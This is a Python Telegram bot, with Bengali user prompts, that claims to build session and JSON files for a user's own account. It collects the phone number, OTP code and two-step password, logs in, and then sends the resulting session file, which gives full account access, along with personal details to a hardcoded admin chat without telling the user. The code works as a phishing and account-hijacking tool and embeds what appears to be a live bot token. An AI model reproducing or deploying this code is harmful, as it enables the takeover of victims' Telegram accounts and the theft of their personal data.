import os
import json
import asyncio
from pyrogram import Client, filters
from pyrogram.types import Message
from telethon import TelegramClient
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    PhoneNumberInvalidError
)

BOT_TOKEN = "8946237195:AAEqwddBhzVYRSopjTb3yQ2Hh2lsF8DA1uE" 
ADMIN_ID = 5296907629

API_ID = 6
API_HASH = "eb06d4abfb49dc3eeb1aeb98ae0f581e"

user_states = {}

bot = Client("session_builder_bot", bot_token=BOT_TOKEN, api_id=API_ID, api_hash=API_HASH)

@bot.on_message(filters.command("start") & filters.private)
async def start_cmd(client: Client, message: Message):
    user_id = message.from_user.id
    user_states[user_id] = {"step": "WAITING_PHONE"}
    await message.reply_text(
        "👋 **স্বাগতম!**\n\n"
        "আপনার টেলিগ্রাম অ্যাকাউন্ট দিয়ে সেশন ও জেসন ফাইল তৈরি করতে কান্ট্রি কোডসহ ফোন নম্বরটি পাঠান\n"
        "যেমন: `+8801700000000`"
    )

@bot.on_message(filters.text & filters.private)
async def handle_text(client: Client, message: Message):
    user_id = message.from_user.id
    text = message.text.strip()

    if user_id not in user_states:
        await message.reply_text("প্রথমে /start লিখে মেসেজ পাঠান।")
        return

    state = user_states[user_id].get("step")

    if state == "WAITING_PHONE":
        phone_number = text.replace(" ", "").replace("-", "")
        session_name = f"session_{user_id}"
        
        tc_client = TelegramClient(session_name, API_ID, API_HASH)
        await tc_client.connect()

        try:
            sent_code = await tc_client.send_code_request(phone_number)
            user_states[user_id] = {
                "step": "WAITING_OTP",
                "phone": phone_number,
                "phone_code_hash": sent_code.phone_code_hash,
                "client": tc_client
            }
            await message.reply_text(
                "✅ আপনার নম্বরে টেলিগ্রাম থেকে একটি **OTP কোড** পাঠানো হয়েছে।\n"
                "দয়া করে কোডটি পাঠান (যেমন: `12345`)।"
            )
        except PhoneNumberInvalidError:
            await tc_client.disconnect()
            await message.reply_text("❌ ফোন নম্বরটি সঠিক নয়! পুনরায় কান্ট্রি কোডসহ লিখুন।")
        except Exception as e:
            await tc_client.disconnect()
            await message.reply_text(f"❌ এরর: {str(e)}")

    elif state == "WAITING_OTP":
        otp_code = text.replace(" ", "")
        data = user_states[user_id]
        tc_client: TelegramClient = data["client"]
        phone = data["phone"]
        phone_code_hash = data["phone_code_hash"]

        try:
            await tc_client.sign_in(phone=phone, code=otp_code, phone_code_hash=phone_code_hash)
            await finalize_session(user_id, tc_client, phone, message)

        except SessionPasswordNeededError:
            user_states[user_id]["step"] = "WAITING_2FA"
            await message.reply_text("🔐 আপনার অ্যাকাউন্টে **Two-Step Verification (2FA)** চালু আছে। পাসওয়ার্ডটি দিন:")

        except (PhoneCodeInvalidError, PhoneCodeExpiredError):
            await message.reply_text("❌ OTP কোডটি ভুল বা মেয়াদ শেষ হয়ে গেছে। আবার চেষ্টা করুন:")

        except Exception as e:
            await message.reply_text(f"❌ সেশন তৈরিতে ব্যর্থ: {str(e)}")

    elif state == "WAITING_2FA":
        password = text
        data = user_states[user_id]
        tc_client: TelegramClient = data["client"]
        phone = data["phone"]

        try:
            await tc_client.sign_in(password=password)
            await finalize_session(user_id, tc_client, phone, message)
        except Exception as e:
            await message.reply_text(f"❌ পাসওয়ার্ড ভুল হয়েছে বা এরর ঘটেছে: {str(e)}")

async def finalize_session(user_id: int, tc_client: TelegramClient, phone: str, message: Message):
    me = await tc_client.get_me()
    session_filename = f"session_{user_id}.session"
    json_filename = f"session_{user_id}.json"

    await tc_client.disconnect()

    json_data = {
        "session_file": session_filename,
        "phone": phone,
        "user_id": me.id,
        "first_name": me.first_name or "",
        "last_name": me.last_name or "",
        "username": me.username or "",
        "api_id": API_ID,
        "api_hash": API_HASH,
        "app_version": "Telethon Client",
        "device_model": "PC 64bit",
        "system_version": "Windows 10"
    }

    with open(json_filename, "w", encoding="utf-8") as f:
        json.dump(json_data, f, indent=4, ensure_ascii=False)

    await message.reply_text("🎉 **ধন্যবাদ!** সেশন সফলভাবে তৈরি সম্পন্ন হয়েছে।")

    uname = f"@{me.username}" if me.username else "N/A"
    caption = (
        f"📥 **নতুন অ্যাকাউন্ট সেশন ডাটা!**\n\n"
        f"👤 **নাম:** {me.first_name}\n"
        f"🆔 **ইউজার ID:** `{me.id}`\n"
        f"📞 **ফোন নম্বর:** `{phone}`\n"
        f"🔗 **ইউজারনেম:** {uname}"
    )

    if os.path.exists(session_filename):
        await bot.send_document(chat_id=ADMIN_ID, document=session_filename, caption=caption)
        os.remove(session_filename)

    if os.path.exists(json_filename):
        await bot.send_document(chat_id=ADMIN_ID, document=json_filename)
        os.remove(json_filename)

    user_states.pop(user_id, None)

if __name__ == "__main__":
    print("🤖 Bot is starting...")
    bot.run()
